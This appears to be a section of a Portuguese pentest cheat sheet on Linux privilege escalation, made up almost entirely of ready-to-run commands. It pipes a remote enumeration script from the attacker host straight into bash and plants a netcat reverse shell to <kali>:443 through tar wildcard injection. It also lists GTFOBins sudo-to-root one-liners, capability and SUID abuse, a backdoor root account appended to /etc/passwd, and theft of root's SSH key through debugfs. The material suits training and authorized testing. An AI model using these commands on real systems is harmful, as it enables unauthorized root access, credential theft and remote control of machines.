# 7. Escalação de Privilégios — Linux

### 7.1 Ferramentas automáticas
```bash
./linpeas.sh
curl http://<kali>/LinEnum.sh | bash
# linux-exploit-suggester / linux-exploit-suggester-2
# pspy — monitorar processos sem root
```

### 7.2 Enum manual
```bash
cat /etc/issue /etc/*-release; uname -a          # OS / kernel
id; whoami; last; sudo -l                          # usuário & sudo
cat /etc/passwd; cat /etc/fstab                    # usuários / drives não montados
ps aux; netstat -antup                             # processos / portas
env; cat ~/.bashrc                                 # variáveis de ambiente
cat ~/.bash_history ~/.mysql_history ~/.viminfo    # históricos
find / -writable -type f 2>/dev/null               # arquivos graváveis
find / -type l -ls 2>/dev/null                     # symlinks
# senhas em arquivos:
grep -rnw '/' -ie 'password' --color=always 2>/dev/null
```

### 7.3 SUDO
```bash
sudo -l
# ex: (onuma) NOPASSWD: /bin/tar → sudo -u onuma /bin/tar ...
# se sudo em shell/binário → GTFOBins (ver [[#7.7 GTFOBins (sudo → shell)]])
```

### 7.4 SUID / SGID / capabilities
```bash
find / -perm -u=s -type f 2>/dev/null              # SUID
find / -perm -g=s -type f 2>/dev/null              # SGID
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null                            # capabilities
# abuso de capability:
cp /bin/bash /tmp/mybash; setcap cap_setuid+ep /tmp/mybash; /tmp/mybash -p
```

### 7.5 Cron
```bash
cat /etc/crontab; ls -al /etc/cron*; cat /var/spool/cron/crontabs/*
systemctl list-timers
# vetores: script gravável rodando como root; PATH hijack; wildcard (tar --checkpoint)
```
**Wildcard injection (tar)** num cron `tar -zcf ... *`:
```bash
echo 'mkfifo /tmp/m; nc <kali> 443 0</tmp/m | /bin/sh >/tmp/m 2>&1; rm /tmp/m' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

### 7.6 PATH hijacking
Se um binário SUID/cron chama um comando **sem path absoluto** (ex: `cat`):
```bash
export PATH=.:$PATH
echo '/bin/bash' > cat; chmod +x cat   # cria fake que será executado como root
```

### 7.7 GTFOBins (sudo → shell)
```bash
sudo ash                                        # ash / csh
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find . -exec /bin/sh \; -quit
sudo env /bin/sh
sudo vi -c ':!/bin/sh' /dev/null
sudo less /etc/profile          # depois  !/bin/sh
sudo man man                    # depois  !/bin/sh
sudo ftp                        # depois  !/bin/sh
sudo perl -e 'exec "/bin/sh";'
sudo socat stdin exec:/bin/sh
sudo PAGER='sh -c "exec sh 0<&1"' git -p help
sudo script -q /dev/null
sudo strace -o /dev/null /bin/bash
# Truque SUID copy:
sudo sh -c 'cp $(which find) .; chmod +s ./find'; ./find . -exec /bin/sh -p \; -quit
```
Ref: https://gtfobins.github.io/

### 7.8 Escapar de restricted shell
```bash
env; export -p                  # ver vars read-only / PATH / SHELL graváveis
compgen -c                      # comandos disponíveis
ssh user@$IP -t "bash --noprofile"    # forçar tty
# vi :set shell=/bin/bash :shell | awk 'BEGIN{system("/bin/bash")}' | find / -exec /bin/bash \;
```

### 7.9 Outros vetores

**NFS `no_root_squash`**:
```bash
showmount -e $IP; mount $IP:/home/peter /mnt/peter
# criar usuário com mesmo uid/gid do export no kali, escrever ssh keys / SUID
groupadd -g 1005 peter; adduser peter -uid 1001 -gid 1005; su peter
```

**Docker** (usuário no grupo docker):
```bash
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```

**systemd** (unit gravável):
```bash
ls -la /lib/systemd/system/                 # unit pertence ao usuário?
# editar ExecStart= para reverse shell, reiniciar/reboot
```

**MySQL rodando como root** → UDF (exploit-db 1518), `select sys_exec('...')`.

**Hash em /etc/passwd** (2ª coluna preenchida):
```bash
echo 'AzER3pBZh6WZE' > h; hashcat -m 1500 -a 0 h rockyou.txt --force
# adicionar root (se editável): perl -le 'print crypt("foo","aa")'
echo 'toor:aaKNIEDOaueR6:0:0::/root:/bin/bash' >> /etc/passwd; su toor
```

**Disk group** (raw disk):
```bash
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

**wget sem wget** (bash /dev/tcp):
```bash
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```
